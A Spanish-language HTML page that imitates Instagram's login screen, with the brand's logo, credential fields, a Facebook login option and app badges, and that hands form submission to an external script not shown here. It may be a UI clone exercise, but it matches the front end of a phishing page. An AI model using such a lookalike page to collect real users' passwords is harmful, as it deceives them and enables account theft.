<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Inicia sesión</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="phone">
            <div class="content">
                <div class="login-box">
                    <img class="logo-img" src="https://i.imgur.com/zWwIbIb.png" alt="Instagram Logo">
                    <form id="loginForm">
                        <input type="text" id="username" name="username" placeholder="Número de teléfono, usuario o correo electrónico" required>
                        <input type="password" id="password" name="password" placeholder="Contraseña" required>
                        <button type="submit" class="login-button">Iniciar sesión</button>
                    </form>
                    <div class="divider">
                        <div class="line"></div>
                        <span>O</span>
                        <div class="line"></div>
                    </div>
                    <div class="facebook-login">
                        <img src="https://i.imgur.com/0k7Us2V.png" alt="Facebook">
                        <span>Iniciar sesión con Facebook</span>
                    </div>
                    <a href="#" class="forgot-password">¿Olvidaste la contraseña?</a>
                </div>
                <div class="signup-box">
                    <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
                </div>
                <div class="app-download">
                    <p>Descarga la aplicación.</p>
                    <div class="app-buttons">
                        <img src="https://i.imgur.com/g489L2M.png" alt="App Store">
                        <img src="https://i.imgur.com/kFgHvW4.png" alt="Google Play">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
